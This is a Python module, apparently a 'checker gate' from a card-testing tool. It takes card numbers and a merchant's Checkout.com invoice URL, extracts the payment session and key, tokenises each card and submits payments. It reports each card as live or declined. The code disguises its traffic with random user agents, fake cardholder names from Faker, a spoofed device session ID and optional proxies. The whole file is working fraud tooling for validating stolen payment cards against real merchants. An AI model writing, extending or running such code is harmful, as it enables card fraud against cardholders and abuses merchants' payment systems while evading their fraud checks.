"""
Checkout.com Auth Gate
AUTH flow using Checkout.com payment sessions
Requires user to provide invoice URL from a Checkout.com merchant
"""

import requests
import re
import json
import random
from typing import Tuple
from faker import Faker
from user_agent import generate_user_agent


def _extract_session_data(session: requests.Session, invoice_url: str, ua: str) -> Tuple[str, str]:
    """
    Extract payment session ID and public key from invoice URL
    Returns (session_id, pk)
    """
    headers = {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Pragma': 'no-cache',
    }
    
    try:
        response = session.get(invoice_url, headers=headers, timeout=30)
        
        if response.status_code != 200:
            return None, None
        
        html = response.text
        
        sess_match = re.search(r'payment_session\\":\s*\{\s*\\"id\\":\s*\\"([^"\\]+)', html)
        pk_match = re.search(r'"pk\\?":\s*\\?"(pk_[^"\\]+)', html)
        
        if not sess_match:
            sess_match = re.search(r'"payment_session":\s*\{\s*"id":\s*"([^"]+)', html)
        if not pk_match:
            pk_match = re.search(r'"pk":\s*"(pk_[^"]+)', html)
        
        if not sess_match or not pk_match:
            return None, None
        
        return sess_match.group(1), pk_match.group(1)
        
    except Exception:
        return None, None


def _tokenize_card(session: requests.Session, ua: str,
                    card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                    cardholder: str) -> Tuple[str, str, str]:
    """
    Tokenize card via Checkout.com card acquisition gateway
    Returns (token, bin, error_msg)
    """
    url = "https://card-acquisition-gateway.checkout.com/tokens"
    
    if len(card_yer) == 2:
        full_year = f"20{card_yer}"
    else:
        full_year = card_yer
    
    payload = {
        "type": "card",
        "expiry_month": card_mon,
        "expiry_year": full_year,
        "number": card_num,
        "name": cardholder,
        "consumer_wallet": {}
    }
    
    headers = {
        'User-Agent': ua,
        'Content-Type': 'application/json',
        'Origin': 'https://checkout-web-components.checkout.com',
        'Referer': 'https://checkout-web-components.checkout.com/',
    }
    
    try:
        response = session.post(url, json=payload, headers=headers, timeout=30)
        
        if response.status_code != 200 and response.status_code != 201:
            return None, None, f"Token error {response.status_code}"
        
        data = response.json()
        
        token = data.get('token')
        bin_val = data.get('bin')
        
        if not token:
            return None, None, "No token in response"
        
        return token, bin_val, None
        
    except Exception as e:
        return None, None, str(e)[:50]


def _submit_payment(session: requests.Session, sess_id: str, pk: str, ua: str,
                     token: str, bin_val: str) -> Tuple[str, bool]:
    """
    Submit payment to Checkout.com payment session
    Returns (result_message, success)
    """
    url = f"https://api.checkout.com/payment-sessions/{sess_id}/submit"
    
    payload = {
        "type": "card",
        "card_metadata": {"bin": bin_val},
        "source": {"token": token},
        "risk": {"device_session_id": f"dsid_{random.randint(10000000, 99999999):024x}"},
        "session_metadata": {
            "internal_platform": {"name": "CheckoutWebComponents", "version": "1.142.0"},
            "feature_flags": [
                "analytics_observability_enabled",
                "card_fields_enabled",
                "get_with_public_key_enabled",
                "logs_observability_enabled",
                "risk_js_enabled",
            ],
            "experiments": {}
        }
    }
    
    headers = {
        'User-Agent': ua,
        'Content-Type': 'application/json',
        'Origin': 'https://checkout-web-components.checkout.com',
        'Referer': 'https://checkout-web-components.checkout.com/',
    }
    
    try:
        response = session.post(url, json=payload, headers=headers, timeout=30)
        
        text = response.text.lower()
        
        if 'payment_attempts_exceeded' in text:
            return "DECLINED ❌ Invoice Voided", False
        
        if 'declined' in text:
            return "DECLINED ❌ Card Declined", False
        
        url_3ds = re.search(r'"url":\s*"([^"]+)"', response.text)
        if url_3ds:
            return "APPROVED ✅ 3DS Required (Card Live)", True
        
        if response.status_code == 200 or response.status_code == 201:
            return "APPROVED ✅ Payment Submitted", True
        
        return "DECLINED ❌ Unknown Response", False
        
    except Exception as e:
        return f"ERROR: {str(e)[:40]}", False


def checkout_auth_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                         invoice_url: str, proxy=None) -> Tuple[str, bool]:
    """
    Check card via Checkout.com AUTH
    
    REQUIRES: Valid invoice URL from a Checkout.com merchant
    
    Args:
        card_num: Card number
        card_mon: Expiry month (MM)
        card_yer: Expiry year (YY or YYYY)
        card_cvc: CVV/CVC
        invoice_url: Checkout.com invoice URL from merchant
        proxy: Optional proxy dict
    
    Returns: (status_message, proxy_used)
    """
    if not invoice_url:
        return ("ERROR: Invoice URL required", False)
    
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    session = requests.Session()
    if proxy:
        session.proxies = proxy
    
    ua = generate_user_agent()
    fake = Faker()
    cardholder = f"{fake.first_name()} {fake.last_name()}"
    
    sess_id, pk = _extract_session_data(session, invoice_url, ua)
    
    if not sess_id or not pk:
        return ("DECLINED ❌ Failed to extract session", False)
    
    token, bin_val, error = _tokenize_card(session, ua, card_num, card_mon, card_yer, card_cvc, cardholder)
    
    if not token:
        return (f"DECLINED ❌ {error or 'Tokenization failed'}", False)
    
    result, success = _submit_payment(session, sess_id, pk, ua, token, bin_val)
    
    return (result, success)


def health_check(invoice_url: str = None) -> bool:
    """Quick health check for Checkout.com"""
    if not invoice_url:
        return False
    try:
        response = requests.get(invoice_url, timeout=10)
        return response.status_code == 200
    except:
        return False
